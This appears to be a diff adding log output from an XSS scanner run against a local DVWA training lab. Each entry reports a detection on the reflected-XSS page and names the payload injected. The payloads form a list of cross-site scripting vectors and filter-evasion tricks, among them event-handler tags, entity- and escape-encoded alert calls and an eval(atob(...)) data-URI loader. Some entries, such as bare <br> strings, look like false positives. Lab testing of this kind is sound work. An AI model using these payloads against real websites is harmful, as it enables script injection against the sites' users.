+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onload=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onpageshow=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onfocus=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onhashchange=alert(1)><a href=#x>click this!#x\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onscroll=alert(1)><br><br><br><br>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<br><br><br><br><br><br><br><br><br><br>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<br><br><br><br><br><br><br><br><br><br>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<br><br><br><br><br><br><x id=x>#x\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onresize=alert(1)>press F12!\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<body onhelp=alert(1)>press F1! (MSIE)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<marquee onstart=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<marquee loop=1 width=0 onfinish=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<audio src onloadstart=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<video onloadstart=alert(1)><source>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<input autofocus onblur=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<keygen autofocus onfocus=alert(1)>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<form onsubmit=alert(1)><input type=submit>\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<select onchange=alert(1)><option>1<option>2\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '<menu id=x contextmenu=x onshow=alert(1)>right click me!\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert`1`\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert&lpar;1&rpar;\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert&#x28;1&#x29\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'alert&#40;1&#41\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '(alert)(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'a=alert,a(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': '[1].find(alert)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'top["al"+"ert"](1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'top[/al/.source+/ert/.source](1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': 'al\\u0065rt(1)\n'}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "top['al\\145rt'](1)\n"}, {'type': 'submit', 'name': None}]}
+[+] XSS Detected on http://192.168.82.128/dvwa/vulnerabilities/xss_r/
+[*] Form details:
+{'action': '#', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'name', 'value': "top['al\\x65rt'](1)\n"}, {'type': 'submit', 'name': None}]}
